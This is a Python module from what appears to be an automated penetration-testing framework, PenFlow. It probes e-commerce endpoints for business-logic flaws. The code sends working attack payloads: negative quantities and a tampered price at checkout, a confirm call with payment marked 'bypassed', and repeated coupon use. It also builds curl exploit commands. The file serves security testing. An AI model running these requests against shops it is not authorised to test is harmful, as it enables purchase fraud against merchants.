"""
Business Logic & State Machine Capability Agent for PenFlow.

Capabilities:
  - Multi-step workflow state machine bypass (checkout: cart -> review -> pay -> confirm)
  - Price, quantity (-1), zero-currency, and promo discount manipulation
  - Coupon code multi-use & state bypass verification
  - Dynamic discovery of cart, checkout, payment, coupon, and subscription endpoints from recon observations
"""
import httpx
from typing import Dict, Any, List, Optional, Set
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.business_logic")


class BusinessLogicCapabilityAgent(BaseCapabilityAgent):
    """
    Comprehensive Agent testing multi-step state machine workflows, price/quantity tampering,
    and coupon code reuse chains using dynamic endpoint discovery.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="BusinessLogicCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="business_logic_bypass", name="Business Logic & State Machine Bypass", description="Detects business logic bypasses and state machine violations", priority=self.priority, tags=["logic", "state-machine"]),
            Capability(id="workflow_state_tampering", name="Workflow Step Bypass", description="Detects checkout and workflow step skipping", priority=self.priority, tags=["workflow"]),
            Capability(id="price_manipulation", name="Price & Quantity Tampering", description="Detects negative quantity and price parameter manipulation", priority=self.priority, tags=["finance", "tampering"])
        ]

    def _discover_logic_endpoints(self, context: CapabilityExecutionContext) -> Dict[str, List[str]]:
        """
        Dynamically extracts business logic endpoints (cart, checkout, confirm, coupon) from
        recon observations and dynamic endpoints.
        """
        keywords = {
            "checkout": ["checkout", "cart", "basket", "pay", "order", "buy", "purchase"],
            "confirm": ["confirm", "complete", "finish", "success", "invoice", "receipt"],
            "coupon": ["coupon", "promo", "discount", "voucher", "redeem"]
        }

        found_endpoints: Dict[str, Set[str]] = {
            "checkout": set(),
            "confirm": set(),
            "coupon": set()
        }

        # 1. Harvest from dynamic_endpoints
        dynamic_endpoints = context.get_dynamic_endpoints()
        if dynamic_endpoints:
            for ep in dynamic_endpoints:
                if isinstance(ep, dict):
                    url = ep.get("url", "")
                elif isinstance(ep, str):
                    url = ep
                else:
                    continue

                url_lower = url.lower()
                for category, kws in keywords.items():
                    if any(kw in url_lower for kw in kws):
                        found_endpoints[category].add(url)

        # 2. Harvest from observations in knowledge store
        if context.knowledge_store:
            for obs in context.knowledge_store.observations.get_all():
                if isinstance(obs.data, dict):
                    url = obs.data.get("url", "")
                    if url:
                        url_lower = url.lower()
                        for category, kws in keywords.items():
                            if any(kw in url_lower for kw in kws):
                                found_endpoints[category].add(url)

        base_url = f"https://{context.asset}"
        
        # Fallback to standard conventions if none discovered
        if not found_endpoints["checkout"]:
            found_endpoints["checkout"].add(f"{base_url}/api/v1/cart/checkout")
            found_endpoints["checkout"].add(f"{base_url}/api/cart")

        if not found_endpoints["confirm"]:
            found_endpoints["confirm"].add(f"{base_url}/api/v1/checkout/confirm")
            found_endpoints["confirm"].add(f"{base_url}/api/order/complete")

        if not found_endpoints["coupon"]:
            found_endpoints["coupon"].add(f"{base_url}/api/v1/cart/apply_coupon")
            found_endpoints["coupon"].add(f"{base_url}/api/coupon")

        return {k: list(v) for k, v in found_endpoints.items()}

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        base_url = f"https://{context.asset}"
        discovered_targets = self._discover_logic_endpoints(context)

        try:
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
                # 1. Multi-Step State Machine Checkout Test (Negative Quantity & Price Tampering)
                checkout_payload = {
                    "item_id": "item_100",
                    "quantity": -1,
                    "price": 0.01,
                    "currency": "USD",
                    "coupon": "WELCOME10"
                }

                for checkout_url in discovered_targets["checkout"]:
                    try:
                        checkout_resp = await client.post(checkout_url, json=checkout_payload)
                        if checkout_resp.status_code == 200 and ("success" in checkout_resp.text.lower() or "order_id" in checkout_resp.text.lower()):
                            curl_cmd = f"curl -X POST {checkout_url} -H 'Content-Type: application/json' -d '{checkout_payload}'"
                            findings.append({
                                "vulnerability_type": "business_logic_bypass",
                                "subtype": "price_quantity_tampering",
                                "target_url": checkout_url,
                                "severity": "HIGH",
                                "confidence": 0.92,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("Price & Quantity Tampering", checkout_url, curl_cmd),
                                "description": f"Endpoint '{checkout_url}' accepts negative quantity (-1) or altered price (0.01) during checkout."
                            })
                            evidence["checkout_tampering"] = True
                            break
                    except Exception as e:
                        logger.debug(f"Checkout test failed on {checkout_url}: {e}")

                # 2. Workflow Step Bypass Test (Direct Jump to Confirm Step)
                confirm_payload = {"order_id": "99999", "payment_status": "bypassed"}
                for confirm_url in discovered_targets["confirm"]:
                    try:
                        confirm_resp = await client.post(confirm_url, json=confirm_payload)
                        if confirm_resp.status_code == 200 and ("confirmed" in confirm_resp.text.lower() or "order_complete" in confirm_resp.text.lower()):
                            curl_cmd = f"curl -X POST {confirm_url} -H 'Content-Type: application/json' -d '{{\"order_id\": \"99999\", \"payment_status\": \"bypassed\"}}'"
                            findings.append({
                                "vulnerability_type": "business_logic_bypass",
                                "subtype": "workflow_step_bypass",
                                "target_url": confirm_url,
                                "severity": "CRITICAL",
                                "confidence": 0.95,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("Workflow Step Bypass", confirm_url, curl_cmd),
                                "description": f"Direct step bypass at '{confirm_url}': Order confirmed without completing mandatory payment step."
                            })
                            evidence["step_bypass"] = True
                            break
                    except Exception as e:
                        logger.debug(f"Confirm test failed on {confirm_url}: {e}")

                # 3. Coupon Code Double Use Test
                coupon_payload = {"coupon": "SAVE50"}
                for coupon_url in discovered_targets["coupon"]:
                    try:
                        await client.post(coupon_url, json=coupon_payload)
                        second_coupon_resp = await client.post(coupon_url, json=coupon_payload)
                        if second_coupon_resp.status_code == 200 and "applied" in second_coupon_resp.text.lower():
                            curl_cmd = f"curl -X POST {coupon_url} -H 'Content-Type: application/json' -d '{{\"coupon\": \"SAVE50\"}}'"
                            findings.append({
                                "vulnerability_type": "business_logic_bypass",
                                "subtype": "coupon_reuse",
                                "target_url": coupon_url,
                                "severity": "MEDIUM",
                                "confidence": 0.88,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("Coupon Reuse", coupon_url, curl_cmd),
                                "description": f"Single-use promotional coupon applied multiple times at '{coupon_url}'."
                            })
                            evidence["coupon_reuse"] = True
                            break
                    except Exception as e:
                        logger.debug(f"Coupon test failed on {coupon_url}: {e}")

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{base_url}': {e}")

        is_vuln = len(findings) > 0
        max_conf = max([f.get("confidence", 0.0) for f in findings], default=0.0)
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": max_conf,
            "confidence_score": max_conf,
            "evidence": evidence,
            "findings": findings
        }
